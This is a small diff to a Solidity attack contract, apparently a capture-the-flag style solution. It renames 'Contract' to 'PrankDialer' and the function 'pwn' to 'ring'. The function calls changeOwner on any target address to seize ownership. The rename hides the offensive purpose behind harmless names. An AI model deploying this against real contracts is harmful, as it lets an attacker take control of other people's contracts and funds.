@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.10;
 
-contract Contract {
+contract PrankDialer {
 
     constructor(){}
 
-    function pwn(address target, address new_owner) public {
+    function ring(address target, address new_owner) public {
         (bool success, ) = target.call(abi.encodeWithSignature("changeOwner(address)", new_owner));
         require(success);
     }
